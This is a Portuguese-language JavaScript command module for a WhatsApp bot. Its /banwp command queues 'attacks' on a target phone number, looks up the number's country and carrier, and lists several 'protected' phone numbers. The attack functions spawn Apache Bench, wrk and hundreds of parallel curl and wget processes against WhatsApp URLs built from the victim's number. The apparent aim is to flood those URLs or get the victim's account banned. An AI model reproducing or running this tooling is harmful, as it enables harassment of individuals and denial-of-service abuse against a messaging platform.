/**
 * 
 * @author Braga 
 */
const { PREFIX } = require(`${BASE_DIR}/config`);
const { exec } = require("child_process");
const { v4: uuidv4 } = require("uuid");

// Configurações globais
const NUMEROS_PROTEGIDOS = [
  "9984271816", "9491005701", "6292218947", "9784058955", "8892526602",
  "351965469392", "5511962001507"
];
const MAXIMO_ATAQUES_SIMULTANEOS = 1;
const TEMPO_LIMITE_ATAQUE = 300000; // 5 minutos

// Fila de ataques
let fila_ataques = [];
let processando_fila = false;

// User-Agents para os ataques
const agentes_usuario = [
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
  "WhatsApp/2.22.7.72 iOS/15.6.1 Device/iPhone13_3",
  "Mozilla/5.0 (iPhone; CPU iPhone OS 14_7_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1"
];

// Endpoints reais do WhatsApp
const endpoints_whatsapp = [
  "https://wa.me/",
  "https://web.whatsapp.com/send?phone=",
  "https://www.whatsapp.com/chat/?phone="
];

module.exports = {
  name: "banwp",
  description: "Executa ataques contra números do WhatsApp com sistema de fila",
  commands: ["banwp"],
  usage: `${PREFIX}banwp <numero_alvo> <tipo_ataque>`,

  /**
   * Manipula o comando /banwp
   * @param {CommandHandleProps} props
   * @returns {Promise<void>}
   */
  handle: async ({ sendReply, sendReact, fullMessage, senderJid }) => {
    try {
      // Extrair argumentos do comando
      const argumentos = fullMessage.split(" ").slice(1);
      if (argumentos.length < 2) {
        return await sendReply("❌ Formato incorreto. Use: /banwp <numero> <tipo_ataque>");
      }
      
      const numero_alvo = String(argumentos[0]);
      const tipo_ataque = String(argumentos[1]).toLowerCase();
      
      // Verificar se o número está protegido
      if (NUMEROS_PROTEGIDOS.includes(numero_alvo.replace(/\D/g, ''))) {
        await sendReact("🚫");
        return await sendReply(`🤬 NÚMERO PROTEGIDO! 🤬\nNão tente atacar ${numero_alvo}, seu arrombado!`);
      }
      
      // Validar número de telefone (apenas dígitos)
      if (!/^\d+$/.test(numero_alvo.replace(/\D/g, ''))) {
        return await sendReply("❌ Número de telefone inválido. Use apenas dígitos.");
      }
      
      // Validar tipo de ataque
      const tipos_ataque_validos = ["bench-fly", "wrshark"];
      if (!tipos_ataque_validos.includes(tipo_ataque)) {
        return await sendReply(`❌ Tipo de ataque inválido. Use: ${tipos_ataque_validos.join(", ")}`);
      }
      
      // Obter informações do número
      const informacoes_numero = await obter_informacoes_numero(numero_alvo);
      
      // Adicionar ataque à fila
      const id_ataque = uuidv4();
      const dados_ataque = {
        id: id_ataque,
        numero_alvo: numero_alvo.replace(/\D/g, ''),
        tipo_ataque: tipo_ataque,
        requisitante: senderJid,
        status: "na_fila",
        inicio_tempo: null
      };
      
      fila_ataques.push(dados_ataque);
      
      // Enviar confirmação
      await sendReact("✅");
      await sendReply(
        `📋 ATAQUE ADICIONADO À FILA\n` +
        `🔢 Número: ${numero_alvo}\n` +
        `📍 Local: ${informacoes_numero.pais || "Desconhecido"}${informacoes_numero.regiao ? ` (${informacoes_numero.regiao})` : ''}\n` +
        `⚔️ Tipo: ${tipo_ataque}\n` +
        `📊 Posição na fila: ${fila_ataques.length}\n` +
        `🆔 ID: ${id_ataque}`
      );
      
      // Processar fila se não estiver sendo processada
      if (!processando_fila) {
        processar_fila(sendReply);
      }
      
    } catch (error) {
      console.error("Erro no comando banwp:", error);
      await sendReply("❌ Erro ao processar o comando.");
    }
  }
};

/**
 * Processa a fila de ataques
 * @param {Function} enviar_resposta - Função para enviar respostas
 */
async function processar_fila(enviar_resposta) {
  processando_fila = true;
  
  while (fila_ataques.length > 0) {
    const ataque = fila_ataques[0];
    
    try {
      // Atualizar status para "em_andamento"
      ataque.status = "em_andamento";
      ataque.inicio_tempo = new Date();
      
      // Enviar notificação de início apenas
      await enviar_resposta(
        `🚀 INICIANDO ATAQUE\n` +
        `🆔 ID: ${ataque.id}\n` +
        `🔢 Número: ${ataque.numero_alvo}\n` +
        `⚔️ Tipo: ${ataque.tipo_ataque}`
      );
      
      // Executar o ataque com base no tipo
      switch (ataque.tipo_ataque) {
        case "bench-fly":
          await executar_ataque_bench_fly(ataque.numero_alvo);
          break;
        case "wrshark":
          await executar_ataque_wrshark(ataque.numero_alvo);
          break;
      }
      
    } catch (error) {
      // Apenas logar o erro, sem notificar o usuário
      console.error("Erro no ataque:", error.message);
    } finally {
      // Remover ataque da fila sem notificação
      fila_ataques.shift();
    }
  }
  
  processando_fila = false;
}

/**
 * Executa ataque do tipo bench-fly
 * @param {string} numero_alvo - Número alvo
 */
async function executar_ataque_bench_fly(numero_alvo) {
  return new Promise((resolver) => {
    try {
      // Selecionar endpoint aleatório
      const endpoint_aleatorio = endpoints_whatsapp[Math.floor(Math.random() * endpoints_whatsapp.length)];
      const url_alvo = endpoint_aleatorio + numero_alvo;
      
      // User-Agent aleatório
      const agente_usuario_aleatorio = agentes_usuario[Math.floor(Math.random() * agentes_usuario.length)];
      
      // Gerar payloads aleatórios com hashes MD5
      const gerar_hash_md5 = () => {
        const crypto = require('crypto');
        return crypto.createHash('md5').update(Math.random().toString()).digest('hex');
      };
      
      // Comando Apache Bench otimizado com payloads dinâmicos
      const comando_ab = `ab -n 10000 -c 500 -H "User-Agent: ${agente_usuario_aleatorio}" -H "Accept: */*" -H "Connection: close" -H "X-Payload: ${gerar_hash_md5()}" "${url_alvo}"`;
      
      // Comando wget adicional
      const comando_wget = `wget --spider --timeout=10 --tries=1 --user-agent="${agente_usuario_aleatorio}" "${url_alvo}" > /dev/null 2>&1`;
      
      // Executar Apache Bench em segundo plano
      exec(comando_ab, { timeout: TEMPO_LIMITE_ATAQUE }, () => resolver());
      
      // Executar múltiplas instâncias wget em paralelo
      for (let i = 0; i < 50; i++) {
        exec(comando_wget);
      }
      
    } catch (error) {
      resolver(); // Sempre resolve, mesmo com erro
    }
  });
}

/**
 * Executa ataque do tipo wrshark
 * @param {string} numero_alvo - Número alvo
 */
async function executar_ataque_wrshark(numero_alvo) {
  return new Promise((resolver) => {
    try {
      const endpoint_aleatorio = endpoints_whatsapp[Math.floor(Math.random() * endpoints_whatsapp.length)];
      const url_alvo = endpoint_aleatorio + numero_alvo;
      const agente_usuario_aleatorio = agentes_usuario[Math.floor(Math.random() * agentes_usuario.length)];
      
      // Verificar se o wrk está instalado
      exec("which wrk || echo 'not-installed'", (error, stdout) => {
        if (stdout.includes('not-installed')) {
          // Se wrk não estiver instalado, usar curl intensivamente
          executar_ataque_com_curl(url_alvo, agente_usuario_aleatorio);
        } else {
          // Comando wrk otimizado para alto desempenho
          const comando_wrk = `wrk -t12 -c1000 -d300s -H "User-Agent: ${agente_usuario_aleatorio}" "${url_alvo}" > /dev/null 2>&1 &`;
          exec(comando_wrk);
        }
        resolver();
      });
      
      // Comando curl adicional para ataques em paralelo
      const comando_curl = `curl -s -o /dev/null -H "User-Agent: ${agente_usuario_aleatorio}" --connect-timeout 3 --max-time 10 --retry 2 "${url_alvo}" &`;
      
      // Executar múltiplas instâncias curl em paralelo
      for (let i = 0; i < 100; i++) {
        exec(comando_curl);
      }
      
    } catch (error) {
      resolver();
    }
  });
}

/**
 * Executa ataque usando curl como fallback
 * @param {string} url_alvo - URL alvo
 * @param {string} agente_usuario - User-Agent para usar
 */
function executar_ataque_com_curl(url_alvo, agente_usuario) {
  const comando_curl = `curl -s -o /dev/null -H "User-Agent: ${agente_usuario}" --connect-timeout 3 --max-time 10 --retry 2 "${url_alvo}" &`;
  
  // Executar muitas instâncias em paralelo
  for (let i = 0; i < 200; i++) {
    exec(comando_curl);
  }
}

/**
 * Obtém informações sobre um número de telefone usando API pública
 * @param {string} numero - Número a ser pesquisado
 * @returns {Promise<Object>} Informações do número
 */
async function obter_informacoes_numero(numero) {
  try {
    // Limpar número (remover caracteres não numéricos)
    const numero_limpo = numero.replace(/\D/g, '');
    
    // Tentar usar API pública para obter informações
    const resposta = await fetch(`http://apilayer.net/api/validate?access_key=free&number=${numero_limpo}&format=1`);
    const dados = await resposta.json();
    
    if (dados.valid) {
      return {
        pais: dados.country_name || "Desconhecido",
        regiao: dados.location || "N/A",
        operadora: dados.carrier || "N/A"
      };
    }
  } catch (error) {
    console.error("Erro ao obter informações do número:", error);
  }
  
  // Fallback para informações básicas baseadas no código do país
  return obter_informacoes_fallback(numero);
}

/**
 * Fallback para obter informações do número baseado no código do país
 * @param {string} numero - Número a ser pesquisado
 * @returns {Object} Informações básicas do número
 */
function obter_informacoes_fallback(numero) {
  const numero_limpo = numero.replace(/\D/g, '');
  
  // Mapeamento de códigos de país
  const codigos_pais = {
    '1': 'EUA/Canadá',
    '55': 'Brasil',
    '351': 'Portugal',
    '34': 'Espanha',
    '39': 'Itália',
    '33': 'França',
    '49': 'Alemanha',
    '44': 'Reino Unido',
    '91': 'Índia',
    '86': 'China',
    '81': 'Japão',
    '7': 'Rússia'
  };
  
  // Encontrar código do país
  let pais = "Desconhecido";
  for (const [codigo, nome] of Object.entries(codigos_pais)) {
    if (numero_limpo.startsWith(codigo)) {
      pais = nome;
      break;
    }
  }
  
  return { pais, regiao: "N/A", operadora: "Desconhecida" };
}
